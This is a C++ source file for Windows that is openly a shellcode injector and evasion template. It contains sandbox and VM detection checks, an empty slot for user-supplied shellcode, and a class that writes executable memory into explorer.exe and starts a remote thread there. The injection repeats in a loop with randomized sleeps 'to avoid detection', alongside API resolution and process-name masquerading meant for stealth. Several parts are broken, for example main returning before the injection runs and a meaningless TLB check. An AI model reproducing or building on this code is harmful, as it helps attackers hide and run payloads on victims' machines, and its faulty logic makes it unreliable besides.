#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <random>
#include <chrono>
#include <memory>
#include <sstream>
#include <functional>
#include <algorithm>
#include <atomic>
#include <fstream>
#include <iomanip>
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <cstdint>
#include <ctime>
#include <chrono>

// Declare the ofs variable as a global variable
std::ofstream ofs;

void self_destruct() {
    if (ofs.is_open()) {
        ofs << "This program has been self-destructed.";
        ofs.close();
        exit(0);  // Terminate the program
    }
}

// Custom exception class
class AntiVMException : public std::runtime_error {
public:
    AntiVMException(const char* message, int errorCode) 
        : std::runtime_error(message), errorCode_(errorCode) {}

    int getErrorCode() const { return errorCode_; }

private:
    int errorCode_;
};

// Timing-based detection
bool timingDetection() {
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    // Perform innocuous task
    for (int i = 0; i < 10000; i++) {
        int x = i * 2;
    }
    QueryPerformanceCounter(&end);
    // Check time difference
    return (end.QuadPart - start.QuadPart) * 1000 / freq.QuadPart > 5;
}

// Multi-timing detection
bool multiTimingDetection() {
    int anomalies = 0;
    for (int i = 0; i < 5; i++) {
        if (timingDetection()) {
            anomalies++;
        }
    }
    return anomalies >= 3;
}

// Math-based detection
bool mathDetection() {
    int result = 0;
    for (int i = 0; i < 10000; i++) {
        result += i * 3 + i * i;
    }
    // Check result
    return result != 299990000;
}

// Multi-math detection
bool multiMathDetection() {
    int anomalies = 0;
    for (int i = 0; i < 5; i++) {
        if (mathDetection()) {
            anomalies++;
        }
    }
    return anomalies >= 3;
}

// TLB flush detection
bool tlbFlushDetection() {
    int* ptr = new int;
    *ptr = 0x12345678;
    // Flush TLB
    FlushProcessWriteBuffers();
    // Check if TLB flush was successful
    return *ptr != 0x12345678;
}

// Detection threshold
constexpr int DETECTION_THRESHOLD = 3;

// Detection function
bool detectAntiVM() {
    int detections = 0;
    if (multiTimingDetection()) {
        detections++;
    }
    if (multiMathDetection()) {
        detections++;
    }
    if (tlbFlushDetection()) {
        detections++;
    }
    if (detections >= DETECTION_THRESHOLD) {
        self_destruct(); // Self-destruct if anti-VM detection is triggered
        return true;
    }
    return false;
}

// Example shellcode (User can replace it with custom shellcode at compile-time)
const std::vector<BYTE> user_shellcode = {
// sHELLCODE GOES HERE

};  

// Utility function for random sleep intervals (to avoid predictable patterns)
void random_sleep(int min_ms, int max_ms) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(min_ms, max_ms);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
}

// Dynamic API resolution for avoiding static analysis
FARPROC resolve_api(const char* module, const char* function) {
    HMODULE hModule = LoadLibraryA(module);
    return hModule ? GetProcAddress(hModule, function) : nullptr;
}

// Function to inject shellcode into a target process
class Injector {
public:
    Injector() {
        // Target process names can be adjusted as needed
        target_processes = { "explorer.exe" };
    }

    // Function to check if a process is running
    bool is_process_running(const std::string& process_name) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (process_name == entry.szExeFile) {
                    CloseHandle(snapshot);
                    return true;
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Inject shellcode into the target process
    bool inject_shellcode(const std::vector<BYTE>& shellcode, const std::string& target_process) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (target_process == entry.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                    if (hProcess) {
                        // Allocate memory in the target process for the shellcode
                        void* mem = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem) {
                            // Write shellcode into the allocated memory space
                            WriteProcessMemory(hProcess, mem, shellcode.data(), shellcode.size(), nullptr);

                            // Create a remote thread to execute the shellcode in the target process
                            HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
                            if (hThread) {
                                // Immediately overwrite the memory after injection
                                VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                CloseHandle(snapshot);
                                return true;
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Function to inject shellcode into multiple processes with randomized sleep intervals
    void inject_into_multiple_processes(const std::vector<BYTE>& shellcode) {
        while (true) {
            for (const auto& process : target_processes) {
                if (is_process_running(process)) {
                    inject_shellcode(shellcode, process);
                }
            }
            random_sleep(5000, 15000);  // Sleep with jitter to avoid detection
        }
    }

private:
    std::vector<std::string> target_processes;
};

// Function to hide thread and make process appear as a benign system process
void hide_thread(HANDLE hThread) {
    // Hide the thread from process listing (optional)
    SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);
    SetThreadAffinityMask(hThread, 1);  // Restrict to a single CPU core for stealth
}

// Function to masquerade process name to mimic system processes
void masquerade_process_name() {
    // Rename current process to match a benign system process (e.g., "svchost.exe")
    SetConsoleTitleA("svchost.exe");
}

// Main function to inject into multiple processes and execute the injection stealthily
void start_injection_threads(Injector& injector, const std::vector<BYTE>& shellcode, int num_threads = 3) {
    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        threads.push_back(std::thread(&Injector::inject_into_multiple_processes, &injector, shellcode));
    }

    for (auto& t : threads) {
        t.join();  // Wait for threads to finish
    }
}
int main() {
    try {
        int anomalies = 0;

        // Combine detection methods
        if (multiTimingDetection()) {
            anomalies++;
        }
        if (multiMathDetection()) {
            anomalies++;            
        }
        if (tlbFlushDetection()) {
            anomalies++;
        }

        // Check detection threshold
        if (anomalies >= DETECTION_THRESHOLD) {
            // Handle VM/debugger detection
            std::cout << "Anomaly detected" << std::endl;
            return 1;
        }

        std::cout << "No anomalies detected" << std::endl;
        return 0;
    } catch (const AntiVMException& e) {
        std::cerr << "Error: " << e.what() << " (Code: " << e.getErrorCode() << ")" << std::endl;
        return 1;
    }

    // Start the injection process using multiple threads
    Injector injector;
    start_injection_threads(injector, user_shellcode);  // Start injecting shellcode

    return 0;
}

